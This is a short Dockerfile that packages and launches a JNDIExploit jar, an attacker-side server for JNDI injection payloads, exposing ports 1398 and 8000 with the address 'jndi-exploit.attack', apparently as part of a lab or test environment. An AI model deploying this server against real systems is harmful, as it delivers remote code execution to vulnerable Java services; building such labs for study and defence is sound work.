FROM gcr.io/distroless/java:11
COPY misc/JNDIExploit-1.2-SNAPSHOT.jar /JNDIExploit-1.2-SNAPSHOT.jar
WORKDIR /
EXPOSE 1398 8000

ENTRYPOINT ["java", "-jar", "/JNDIExploit-1.2-SNAPSHOT.jar", "-p", "8000","-i", "jndi-exploit.attack"]
